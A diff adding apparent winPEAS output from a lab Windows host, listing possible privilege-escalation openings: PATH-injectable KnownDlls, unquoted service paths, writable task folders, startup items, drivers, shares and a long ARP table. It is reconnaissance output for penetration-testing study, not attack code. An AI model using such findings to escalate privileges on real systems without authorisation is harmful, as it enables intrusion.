+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: wow64
+    Folder: None (PATH Injection)
+    File: wow64.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: wow64win
+    Folder: None (PATH Injection)
+    File: wow64win.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: WS2_32
+    Folder: None (PATH Injection)
+    File: WS2_32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: _Wow64
+    Folder: None (PATH Injection)
+    File: Wow64.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: _Wow64cpu
+    Folder: None (PATH Injection)
+    File: Wow64cpu.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: _Wow64win
+    Folder: None (PATH Injection)
+    File: Wow64win.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: LPK
+    Folder: None (PATH Injection)
+    File: LPK.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
+    Key: StubPath
+    Folder: \
+    FolderPerms: Authenticated Users [AppendData/CreateDirectories]
+    File: /UserInstall
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
+    Key: StubPath
+    Folder: C:\WINDOWS\system32
+    File: C:\WINDOWS\system32\unregmp2.exe /FirstLogon
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
+    Key: StubPath
+    Folder: None (PATH Injection)
+    File: U
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
+    Key: StubPath
+    Folder: C:\Windows\System32
+    File: C:\Windows\System32\ie4uinit.exe -UserConfig
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
+    Key: StubPath
+    Folder: C:\Windows\System32
+    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{9459C573-B17A-45AE-9F64-1857B5D58CEE}
+    Key: StubPath
+    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\90.0.818.46\Installer
+    File: C:\Program Files (x86)\Microsoft\Edge\Application\90.0.818.46\Installer\setup.exe --configure-user-settings --verbose-logging --system-level --msedge (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
+    Key: StubPath
+    Folder: C:\WINDOWS\system32
+    File: C:\WINDOWS\system32\unregmp2.exe /FirstLogon
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
+    Key: StubPath
+    Folder: C:\Windows\SysWOW64
+    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
+    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\90.0.818.46\BHO
+    File: C:\Program Files (x86)\Microsoft\Edge\Application\90.0.818.46\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
+    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\90.0.818.46\BHO
+    File: C:\Program Files (x86)\Microsoft\Edge\Application\90.0.818.46\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected)
+   =================================================================================================
+
+
+    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
+   =================================================================================================
+
+
+    Folder: C:\Users\Phoebe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+    FolderPerms: Phoebe [AllAccess]
+    File: C:\Users\Phoebe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
+    FilePerms: Phoebe [AllAccess]
+   =================================================================================================
+
+
+    Folder: C:\Users\Phoebe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+    FolderPerms: Phoebe [AllAccess]
+    File: C:\Users\Phoebe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xampp-control - Shortcut.lnk (Unquoted and Space detected)
+    FilePerms: Phoebe [AllAccess]
+   =================================================================================================
+
+
+    Folder: C:\windows\tasks
+    FolderPerms: Authenticated Users [WriteData/CreateFiles]
+   =================================================================================================
+
+
+    Folder: C:\windows\system32\tasks
+    FolderPerms: Authenticated Users [WriteData/CreateFiles]
+   =================================================================================================
+
+
+    Folder: C:\windows
+    File: C:\windows\system.ini
+   =================================================================================================
+
+
+    Folder: C:\windows
+    File: C:\windows\win.ini
+   =================================================================================================
+
+
+    Key: From WMIC
+    Folder: C:\Users\Phoebe\AppData\Local\Microsoft\OneDrive
+    FolderPerms: Phoebe [AllAccess]
+    File: C:\Users\Phoebe\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
+    FilePerms: Phoebe [AllAccess]
+   =================================================================================================
+
+
+    Key: From WMIC
+    Folder: C:\WINDOWS\system32
+    File: C:\WINDOWS\system32\SecurityHealthSystray.exe
+   =================================================================================================
+
+
+    Key: From WMIC
+    Folder: C:\WINDOWS\system32
+    File: C:\WINDOWS\system32\vm3dservice.exe -u
+   =================================================================================================
+
+
+    Key: From WMIC
+    Folder: C:\Program Files\VMware\VMware Tools
+    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr
+   =================================================================================================
+
+
+  [+] Scheduled Applications --Non Microsoft--
+   [?] Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
+
+  [+] Device Drivers --Non Microsoft--
+   [?] Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#vulnerable-drivers
+    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
+    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
+    VMware vSockets Service - 9.8.16.0 build-14168184 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
+    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
+    VMware PCI VMCI Bus Device - 9.8.16.0 build-14168184 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
+    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
+    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
+    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
+    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
+    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
+    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
+    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
+    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys
+    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
+    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
+    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
+    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
+    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
+    MEGASAS RAID Controller Driver for Windows - 6.714.20.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
+    MEGASAS RAID Controller Driver for Windows - 7.710.10.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys
+    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
+    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
+    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
+    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
+    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
+    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
+    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
+    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
+     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
+    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys
+    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1015 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys
+    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
+    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
+    SmartRAID, SmartHBA PQI Storport Driver - 1.50.1.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys
+    VMware Pointing USB Device Driver - 12.5.10.0 build-14169150 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmusbmouse.sys
+    VMware Pointing PS/2 Device Driver - 12.5.10.0 build-14169150 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
+    VMware SVGA 3D - 8.16.07.0008 - build-16233244 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
+    VMware SVGA 3D - 8.16.07.0008 - build-16233244 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
+    VMware PCIe Ethernet Adapter NDIS 6.30 (64-bit) - 1.8.17.0 build-17274505 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmxnet3.sys
+    VMware server memory controller - 7.5.5.0 build-14903665 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys
+
+
+  =========================================(Network Information)=========================================
+
+  [+] Network Shares
+    ADMIN$ (Path: C:\WINDOWS)
+    C$ (Path: C:\)
+    IPC$ (Path: )
+
+  [+] Enumerate Network Mapped Drives (WMI)
+
+  [+] Host File
+
+  [+] Network Ifaces and known hosts
+   [?] The masks are only for the IPv4 addresses 
+    Ethernet0 2[00:50:56:B9:ED:59]: 10.129.125.149 / 255.255.0.0
+        Gateways: 10.129.0.1
+        DNSs: 1.1.1.1, 8.8.8.8
+        Known hosts:
+          10.129.0.1            00-50-56-B9-B5-5B     Dynamic
+          10.129.1.36           00-50-56-B9-2D-53     Dynamic
+          10.129.1.203          00-50-56-B9-01-4D     Dynamic
+          10.129.2.71           00-50-56-B9-D5-39     Dynamic
+          10.129.2.187          00-50-56-B9-9A-13     Dynamic
+          10.129.2.224          00-50-56-B9-2F-35     Dynamic
+          10.129.3.199          00-50-56-B9-76-B6     Dynamic
+          10.129.5.34           00-50-56-B9-9D-D5     Dynamic
+          10.129.5.87           00-50-56-B9-BC-D9     Dynamic
+          10.129.5.179          00-50-56-B9-03-54     Dynamic
+          10.129.7.135          00-50-56-B9-EB-A3     Dynamic
+          10.129.8.1            00-50-56-B9-F3-B8     Dynamic
+          10.129.9.95           00-50-56-B9-A3-79     Dynamic
+          10.129.10.64          00-50-56-B9-19-99     Dynamic
+          10.129.10.126         00-50-56-B9-D0-47     Dynamic
+          10.129.11.135         00-50-56-B9-3C-FF     Dynamic
+          10.129.12.13          00-50-56-B9-F4-CA     Dynamic
+          10.129.12.29          00-50-56-B9-E4-41     Dynamic
+          10.129.12.30          00-50-56-B9-4D-76     Dynamic
+          10.129.13.79          00-50-56-B9-70-F2     Dynamic
+          10.129.14.8           00-50-56-B9-FC-C6     Dynamic
+          10.129.14.97          00-50-56-B9-7E-27     Dynamic
+          10.129.14.157         00-50-56-B9-44-04     Dynamic
+          10.129.14.194         00-50-56-B9-56-99     Dynamic
+          10.129.22.99          00-50-56-B9-05-3D     Dynamic
+          10.129.23.197         00-50-56-B9-2E-8C     Dynamic
+          10.129.24.20          00-50-56-B9-D6-6A     Dynamic
+          10.129.33.110         00-50-56-B9-77-D6     Dynamic
+          10.129.42.104         00-50-56-B9-B9-53     Dynamic
+          10.129.46.227         00-50-56-B9-D3-7D     Dynamic
+          10.129.48.103         00-50-56-B9-8F-B2     Dynamic
+          10.129.49.181         00-50-56-B9-4F-A5     Dynamic
+          10.129.49.227         00-50-56-B9-49-43     Dynamic
+          10.129.50.234         00-50-56-B9-25-1F     Dynamic
+          10.129.51.20          00-50-56-B9-09-BB     Dynamic
+          10.129.56.230         00-50-56-B9-68-52     Dynamic
+          10.129.57.92          00-50-56-B9-FD-CF     Dynamic
+          10.129.57.192         00-50-56-B9-9F-27     Dynamic
+          10.129.58.55          00-50-56-B9-A0-79     Dynamic
+          10.129.58.88          00-50-56-B9-C6-F7     Dynamic
+          10.129.85.122         00-50-56-B9-0C-75     Dynamic
+          10.129.85.155         00-50-56-B9-C9-7D     Dynamic
+          10.129.86.244         00-50-56-B9-B2-D1     Dynamic
+          10.129.87.57          00-50-56-B9-84-30     Dynamic
+          10.129.88.53          00-50-56-B9-51-4E     Dynamic
+          10.129.88.54          00-50-56-B9-C3-95     Dynamic
+          10.129.88.65          00-50-56-B9-B9-B0     Dynamic
+          10.129.88.149         00-50-56-B9-10-76     Dynamic
+          10.129.88.224         00-50-56-B9-98-D4     Dynamic
+          10.129.89.52          00-50-56-B9-90-B0     Dynamic
+          10.129.89.177         00-50-56-B9-77-0D     Dynamic
+          10.129.90.18          00-50-56-B9-62-F7     Dynamic
+          10.129.91.150         00-50-56-B9-A4-DD     Dynamic
+          10.129.91.198         00-50-56-B9-1B-C3     Dynamic
+          10.129.92.66          00-50-56-B9-39-35     Dynamic
+          10.129.92.144         00-50-56-B9-FA-2E     Dynamic
+          10.129.92.162         00-50-56-B9-53-93     Dynamic
+          10.129.93.17          00-50-56-B9-27-AD     Dynamic
+          10.129.94.79          00-50-56-B9-EF-9F     Dynamic
+          10.129.95.144         00-50-56-B9-7F-93     Dynamic
+          10.129.95.229         00-50-56-B9-CD-3D     Dynamic
+          10.129.96.126         00-50-56-B9-AC-DC     Dynamic
+          10.129.96.142         00-50-56-B9-CE-D4     Dynamic
+          10.129.97.180         00-50-56-B9-4E-AB     Dynamic
+          10.129.99.132         00-50-56-B9-55-04     Dynamic
+          10.129.99.138         00-50-56-B9-DF-05     Dynamic
+          10.129.100.70         00-50-56-B9-16-71     Dynamic
+          10.129.100.125        00-50-56-B9-E1-06     Dynamic
+          10.129.100.196        00-50-56-B9-D8-44     Dynamic
+          10.129.100.226        00-50-56-B9-D5-09     Dynamic
+          10.129.100.249        00-50-56-B9-9A-4C     Dynamic
+          10.129.101.42         00-50-56-B9-6B-C8     Dynamic
+          10.129.101.145        00-50-56-B9-61-9E     Dynamic
+          10.129.102.207        00-50-56-B9-A6-F6     Dynamic
+          10.129.102.210        00-50-56-B9-E5-2A     Dynamic
+          10.129.103.80         00-50-56-B9-59-0C     Dynamic
+          10.129.104.95         00-50-56-B9-21-12     Dynamic
+          10.129.104.147        00-50-56-B9-63-28     Dynamic
+          10.129.105.3          00-50-56-B9-56-0A     Dynamic
+          10.129.105.40         00-50-56-B9-D8-85     Dynamic
+          10.129.105.212        00-50-56-B9-09-B9     Dynamic
+          10.129.105.253        00-50-56-B9-F8-2C     Dynamic
+          10.129.106.10         00-50-56-B9-BB-DB     Dynamic
+          10.129.106.42         00-50-56-B9-22-A5     Dynamic
+          10.129.107.42         00-50-56-B9-27-AC     Dynamic
+          10.129.107.156        00-50-56-B9-FE-0B     Dynamic
+          10.129.108.118        00-50-56-B9-7C-DC     Dynamic
+          10.129.108.122        00-50-56-B9-5E-62     Dynamic
+          10.129.108.202        00-50-56-B9-67-B7     Dynamic
+          10.129.109.64         00-50-56-B9-2A-14     Dynamic
+          10.129.109.69         00-50-56-B9-D2-BA     Dynamic
+          10.129.109.133        00-50-56-B9-73-6C     Dynamic
+          10.129.109.163        00-50-56-B9-33-4C     Dynamic
+          10.129.109.218        00-50-56-B9-EE-D1     Dynamic
+          10.129.110.107        00-50-56-B9-B2-79     Dynamic
+          10.129.110.238        00-50-56-B9-A3-5F     Invalid
+          10.129.111.83         00-50-56-B9-A7-4E     Dynamic
+          10.129.111.166        00-50-56-B9-97-A3     Dynamic
+          10.129.111.230        00-50-56-B9-03-FC     Dynamic
+          10.129.113.250        00-50-56-B9-68-FE     Dynamic
+          10.129.114.2          00-50-56-B9-9C-AA     Dynamic
+          10.129.115.74         00-50-56-B9-D0-0E     Dynamic
+          10.129.116.159        00-50-56-B9-33-78     Dynamic
+          10.129.116.179        00-50-56-B9-5B-50     Dynamic
+          10.129.116.212        00-50-56-B9-62-BE     Dynamic
+          10.129.117.132        00-50-56-B9-3B-C3     Dynamic
+          10.129.117.173        00-50-56-B9-F9-48     Dynamic
+          10.129.117.182        00-50-56-B9-E8-96     Dynamic
+          10.129.118.14         00-50-56-B9-88-E8     Dynamic
+          10.129.118.47         00-50-56-B9-E8-A5     Dynamic
+          10.129.118.74         00-50-56-B9-B8-D7     Dynamic
+          10.129.120.39         00-50-56-B9-A9-B8     Dynamic
+          10.129.121.252        00-50-56-B9-BD-B6     Dynamic
+          10.129.122.28         00-50-56-B9-94-F2     Dynamic
+          10.129.122.250        00-50-56-B9-D6-C1     Dynamic
+          10.129.123.29         00-50-56-B9-33-CA     Dynamic
+          10.129.123.147        00-50-56-B9-F0-F8     Dynamic
+          10.129.123.170        00-50-56-B9-07-7D     Dynamic
+          10.129.123.201        00-50-56-B9-E0-1F     Dynamic
+          10.129.123.236        00-50-56-B9-4F-67     Dynamic
+          10.129.124.4          00-50-56-B9-72-96     Dynamic
+          10.129.124.6          00-50-56-B9-80-02     Dynamic
+          10.129.124.8          00-50-56-B9-A0-81     Dynamic
+          10.129.124.16         00-50-56-B9-7C-50     Dynamic
+          10.129.124.20         00-50-56-B9-D9-6D     Dynamic
+          10.129.124.32         00-50-56-B9-C0-75     Dynamic
+          10.129.124.34         00-50-56-B9-42-2B     Dynamic
+          10.129.124.45         00-50-56-B9-1A-49     Dynamic
+          10.129.124.50         00-50-56-B9-FC-4A     Dynamic
+          10.129.124.55         00-50-56-B9-77-D0     Dynamic
+          10.129.124.60         00-50-56-B9-68-38     Dynamic
+          10.129.124.61         00-50-56-B9-12-0C     Dynamic
+          10.129.124.63         00-50-56-B9-91-9D     Dynamic
+          10.129.124.66         00-50-56-B9-11-94     Dynamic
+          10.129.124.73         00-50-56-B9-25-0F     Dynamic
+          10.129.124.75         00-50-56-B9-AE-71     Dynamic
+          10.129.124.77         00-50-56-B9-1E-6A     Dynamic
+          10.129.124.81         00-50-56-B9-B9-67     Dynamic
+          10.129.124.83         00-50-56-B9-7A-98     Invalid
+          10.129.124.85         00-50-56-B9-63-A2     Dynamic
+          10.129.124.86         00-50-56-B9-B7-AB     Dynamic
+          10.129.124.88         00-50-56-B9-D4-50     Dynamic
+          10.129.124.89         00-50-56-B9-1E-90     Dynamic
+          10.129.124.91         00-50-56-B9-23-C3     Dynamic
+          10.129.124.95         00-50-56-B9-0D-36     Dynamic
+          10.129.124.97         00-50-56-B9-09-2C     Dynamic
+          10.129.124.100        00-50-56-B9-E8-41     Dynamic
+          10.129.124.105        00-50-56-B9-4C-54     Dynamic
+          10.129.124.106        00-50-56-B9-CA-84     Dynamic
+          10.129.124.125        00-50-56-B9-71-83     Dynamic
+          10.129.124.126        00-50-56-B9-DA-42     Dynamic
+          10.129.124.127        00-50-56-B9-4D-AA     Dynamic
+          10.129.124.129        00-50-56-B9-89-47     Dynamic
+          10.129.124.132        00-50-56-B9-07-E5     Dynamic
+          10.129.124.133        00-50-56-B9-FA-9B     Dynamic
+          10.129.124.138        00-50-56-B9-CF-73     Dynamic
+          10.129.124.142        00-50-56-B9-9F-46     Dynamic
+          10.129.124.143        00-50-56-B9-63-DB     Dynamic
+          10.129.124.146        00-50-56-B9-A8-3D     Dynamic
+          10.129.124.149        00-50-56-B9-67-7F     Dynamic
+          10.129.124.155        00-50-56-B9-B2-90     Dynamic
+          10.129.124.157        00-50-56-B9-27-28     Dynamic
+          10.129.124.158        00-50-56-B9-57-2D     Dynamic
+          10.129.124.159        00-50-56-B9-51-5F     Dynamic
+          10.129.124.169        00-50-56-B9-D6-36     Dynamic
+          10.129.124.172        00-50-56-B9-BD-9D     Dynamic
+          10.129.124.187        00-50-56-B9-43-C4     Dynamic
+          10.129.124.190        00-50-56-B9-D2-5F     Dynamic
+          10.129.124.194        00-50-56-B9-96-5B     Dynamic
+          10.129.124.217        00-50-56-B9-84-40     Dynamic
+          10.129.124.218        00-50-56-B9-D1-8C     Dynamic
+          10.129.124.219        00-50-56-B9-0F-99     Dynamic
+          10.129.124.228        00-50-56-B9-01-32     Dynamic
+          10.129.124.231        00-50-56-B9-5C-52     Dynamic
+          10.129.124.232        00-50-56-B9-77-9E     Dynamic
+          10.129.124.236        00-50-56-B9-BE-C8     Dynamic
+          10.129.124.240        00-50-56-B9-0D-0D     Dynamic
+          10.129.124.242        00-50-56-B9-51-71     Dynamic
+          10.129.124.243        00-50-56-B9-CE-B7     Dynamic
+          10.129.124.244        00-50-56-B9-14-8D     Dynamic
+          10.129.124.246        00-50-56-B9-5E-EA     Dynamic
+          10.129.124.248        00-50-56-B9-F6-1C     Dynamic
+          10.129.124.250        00-50-56-B9-40-E9     Dynamic
+          10.129.124.252        00-50-56-B9-2B-40     Dynamic
+          10.129.124.255        00-50-56-B9-61-A2     Dynamic
+          10.129.125.11         00-50-56-B9-E3-DC     Dynamic
+          10.129.125.14         00-50-56-B9-93-59     Dynamic
+          10.129.125.19         00-50-56-B9-CB-B3     Dynamic
+          10.129.125.28         00-50-56-B9-FB-59     Dynamic
+          10.129.125.33         00-50-56-B9-1B-5C     Dynamic
+          10.129.125.34         00-50-56-B9-66-66     Dynamic
+          10.129.125.41         00-50-56-B9-0D-18     Dynamic
+          10.129.125.48         00-50-56-B9-8C-4D     Dynamic
+          10.129.125.49         00-50-56-B9-38-98     Dynamic
+          10.129.125.51         00-50-56-B9-8E-F4     Dynamic
+          10.129.125.58         00-50-56-B9-D4-B7     Dynamic
+          10.129.125.62         00-50-56-B9-20-94     Dynamic
+          10.129.125.71         00-50-56-B9-B8-DF     Dynamic
+          10.129.125.75         00-50-56-B9-F8-C8     Dynamic
+          10.129.125.76         00-50-56-B9-04-DA     Dynamic
+          10.129.125.78         00-50-56-B9-46-4F     Dynamic
+          10.129.125.79         00-50-56-B9-E4-6B     Dynamic
+          10.129.125.80         00-50-56-B9-5B-07     Dynamic
+          10.129.125.86         00-50-56-B9-22-75     Dynamic
+          10.129.125.87         00-50-56-B9-69-DE     Dynamic
+          10.129.125.88         00-50-56-B9-EE-74     Dynamic
+          10.129.125.91         00-50-56-B9-AF-8E     Dynamic
+          10.129.125.93         00-50-56-B9-AF-DF     Dynamic
+          10.129.125.95         00-50-56-B9-A6-64     Dynamic
+          10.129.125.98         00-50-56-B9-56-47     Dynamic
+          10.129.125.104        00-50-56-B9-4F-E4     Dynamic
+          10.129.125.105        00-50-56-B9-AA-5F     Dynamic
+          10.129.125.109        00-50-56-B9-F8-75     Dynamic
+          10.129.125.112        00-50-56-B9-1F-4D     Dynamic
+          10.129.125.114        00-50-56-B9-64-D3     Dynamic
+          10.129.125.115        00-50-56-B9-30-23     Dynamic
+          10.129.125.119        00-50-56-B9-3E-58     Dynamic
+          10.129.125.121        00-50-56-B9-E7-56     Dynamic
+          10.129.125.122        00-50-56-B9-EC-48     Dynamic
+          10.129.125.128        00-50-56-B9-EE-54     Dynamic
+          10.129.125.129        00-50-56-B9-5E-AF     Dynamic
+          10.129.125.130        00-50-56-B9-4B-74     Dynamic
+          10.129.125.132        00-50-56-B9-6D-FE     Dynamic
+          10.129.125.133        00-50-56-B9-76-16     Dynamic
+          10.129.125.137        00-50-56-B9-09-2D     Dynamic
+          10.129.125.140        00-50-56-B9-92-A3     Dynamic
+          10.129.125.142        00-50-56-B9-98-0C     Dynamic
+          10.129.125.143        00-50-56-B9-A0-38     Dynamic
+          10.129.125.148        00-50-56-B9-98-51     Dynamic
+          10.129.125.150        00-50-56-B9-D2-E3     Dynamic
+          10.129.125.151        00-50-56-B9-0B-CC     Dynamic
+          10.129.125.152        00-50-56-B9-8B-5E     Dynamic
+          10.129.125.153        00-50-56-B9-FC-07     Dynamic
+          10.129.125.154        00-50-56-B9-FF-E6     Dynamic
+          10.129.125.155        00-50-56-B9-46-4B     Dynamic
+          10.129.125.156        00-50-56-B9-D6-CA     Dynamic
+          10.129.125.157        00-50-56-B9-0A-0F     Dynamic
+          10.129.125.158        00-50-56-B9-0F-95     Dynamic
+          10.129.125.159        00-50-56-B9-51-6B     Dynamic
+          10.129.125.160        00-50-56-B9-42-AC     Dynamic
+          10.129.125.161        00-50-56-B9-59-00     Dynamic
+          10.129.125.162        00-50-56-B9-84-C9     Dynamic
+          10.129.125.163        00-50-56-B9-08-99     Dynamic
+          10.129.125.164        00-50-56-B9-F4-D3     Dynamic
+          10.129.125.165        00-50-56-B9-13-D2     Invalid
+          10.129.125.166        00-50-56-B9-FD-DD     Dynamic
+          10.129.125.167        00-50-56-B9-4C-47     Dynamic
+          10.129.125.168        00-50-56-B9-95-D9     Dynamic
+          10.129.125.169        00-50-56-B9-FE-E1     Dynamic
+          10.129.125.170        00-50-56-B9-DA-2F     Dynamic
+          10.129.125.171        00-50-56-B9-BE-F4     Invalid
+          10.129.125.172        00-50-56-B9-18-C8     Dynamic
+          10.129.125.173        00-50-56-B9-1C-C2     Dynamic
+          10.129.125.174        00-50-56-B9-39-47     Dynamic
+          10.129.125.175        00-50-56-B9-18-FB     Dynamic
+          10.129.125.176        00-50-56-B9-06-88     Invalid
+          10.129.125.177        00-50-56-B9-ED-44     Dynamic
+          10.129.125.178        00-50-56-B9-AA-4E     Dynamic
+          10.129.125.179        00-50-56-B9-2B-B7     Dynamic
+          10.129.125.180        00-50-56-B9-17-2B     Dynamic
+          10.129.125.181        00-50-56-B9-67-96     Dynamic
+          10.129.125.182        00-50-56-B9-95-E7     Dynamic
+          10.129.125.183        00-50-56-B9-18-F3     Dynamic
+          10.129.125.184        00-50-56-B9-BD-CA     Dynamic
+          10.129.125.185        00-50-56-B9-31-0C     Dynamic
+          10.129.125.186        00-50-56-B9-14-80     Dynamic
+          10.129.125.187        00-50-56-B9-BE-5F     Dynamic
+          10.129.125.188        00-50-56-B9-AB-15     Dynamic
+          10.129.125.189        00-50-56-B9-B5-3C     Dynamic
